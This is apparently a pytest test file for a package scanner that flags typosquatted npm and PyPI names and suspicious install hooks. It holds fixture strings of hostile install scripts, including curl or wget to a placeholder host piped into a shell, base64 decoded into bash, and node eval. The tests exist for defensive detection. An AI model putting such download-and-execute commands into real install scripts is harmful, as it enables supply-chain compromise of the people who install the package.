import pytest

from scan import check_install_scripts, check_typosquat, edit_distance, homoglyph_candidates

SMALL_TOP = {"npm": {"lodash", "express", "ms", "chalk"}, "pypi": {"requests", "numpy", "colorama", "typing-extensions"}}


def codes(reasons):
    return {r["code"] for r in reasons}


@pytest.mark.parametrize("a,b,dist", [("abc", "abc", 0), ("ab", "ba", 1), ("kitten", "sitting", 3), ("", "abc", 3)])
def test_edit_distance(a, b, dist):
    assert edit_distance(a, b) == dist


@pytest.mark.parametrize("eco,name,target", [
    ("pypi", "reqeusts", "requests"),  # swapped letters
    ("npm", "lodahs", "lodash"),  # swapped letters
    ("npm", "expresss", "express"),  # extra letter
    ("pypi", "numpi", "numpy"),  # substituted letter
])
def test_edit_distance_one_is_flagged(eco, name, target):
    hit = check_typosquat(eco, name, SMALL_TOP)
    assert hit["code"] == "typosquat_edit1"
    assert target in hit["detail"]


@pytest.mark.parametrize("eco,name,target", [
    ("pypi", "c0lorama", "colorama"),  # zero for o
    ("pypi", "nurnpy", "numpy"),  # rn for m
    ("npm", "l0dash", "lodash"),
    ("pypi", "nуmpy", "numpy"),  # Cyrillic u-lookalike
])
def test_homoglyphs_are_flagged(eco, name, target):
    hit = check_typosquat(eco, name, SMALL_TOP)
    assert hit["code"] == "typosquat_homoglyph"
    assert target in hit["detail"]


@pytest.mark.parametrize("eco,name", [
    ("npm", "lodash"),  # the real thing
    ("pypi", "Requests"),  # case is normalised
    ("pypi", "typing_extensions"),  # PEP 503 separator normalisation
    ("npm", "totally-unrelated-name"),
    ("npm", "mz"),  # too short to call a typo of "ms"
    ("npm", "@scope/lodahs"),  # scoped names are skipped
])
def test_legitimate_or_unrelated_names_are_not_flagged(eco, name):
    assert check_typosquat(eco, name, SMALL_TOP) is None


def test_very_popular_lookalike_is_trusted():
    assert check_typosquat("npm", "lodahs", SMALL_TOP, weekly_downloads=5_000_000) is None
    assert check_typosquat("npm", "lodahs", SMALL_TOP, weekly_downloads=50)["code"] == "typosquat_edit1"


def test_homoglyph_candidates_exclude_the_name_itself():
    assert "colorama" in homoglyph_candidates("c0lorama")
    assert homoglyph_candidates("numpy") == set()


def test_bundled_top_list_catches_fixture_typosquats(top):
    assert "lodash" in top["npm"] and "requests" in top["pypi"]
    assert check_typosquat("pypi", "reqeusts", top)["code"] == "typosquat_edit1"
    assert check_typosquat("npm", "lodahs", top)["code"] == "typosquat_edit1"
    assert check_typosquat("npm", "lodash", top) is None


def test_curl_pipe_to_shell_in_postinstall():
    found = codes(check_install_scripts({"postinstall": "curl -s http://example.invalid/setup.sh | sh"}))
    assert found == {"install_script", "install_script_download", "install_script_exec"}


def test_base64_decode_into_shell():
    found = codes(check_install_scripts({"postinstall": "echo ZWNobyBoaQ== | base64 -d | bash"}))
    assert {"install_script_encoded", "install_script_exec"} <= found
    assert "install_script_download" not in found


def test_eval_and_node_dash_e():
    assert "install_script_exec" in codes(check_install_scripts({"install": "node -e \"eval(process.argv[1])\""}))


def test_plain_build_step_only_gets_the_base_flag():
    assert codes(check_install_scripts({"install": "node-gyp rebuild"})) == {"install_script"}


def test_every_install_hook_is_checked():
    for hook in ("preinstall", "install", "postinstall"):
        assert "install_script_download" in codes(check_install_scripts({hook: "wget http://example.invalid/x"}))


def test_non_install_hooks_are_ignored():
    assert check_install_scripts({"test": "curl http://example.invalid | sh", "build": "tsc"}) == []


def test_missing_or_odd_scripts_are_safe():
    assert check_install_scripts(None) == []
    assert check_install_scripts({}) == []
    assert check_install_scripts({"postinstall": ["curl", "x"]}) == []
    assert check_install_scripts({"postinstall": "   "}) == []
